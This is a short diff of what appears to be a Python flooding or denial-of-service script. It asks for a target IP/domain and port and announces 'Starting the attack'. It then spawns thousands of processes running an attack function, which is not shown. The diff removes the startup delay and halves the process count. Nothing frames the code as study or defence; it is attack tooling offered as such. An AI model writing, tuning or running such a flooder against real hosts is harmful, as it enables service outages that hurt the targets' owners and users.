@@ -47,10 +47,10 @@ ip = input("IP/Domain: ")
 port = int(input("Port: "))
 url = f"http://{str(ip)}"
 print("[>>>] Starting the attack [<<<]")
-sleep(1)
+sleep(0)
 
 def send2attack():
-  for i in range(5000): #Magic Power
+  for i in range(2500): #Magic Power
     mp = multiprocessing.Process(target=attack)
     mp.setDaemon = False
     mp.start() #Magic Starts
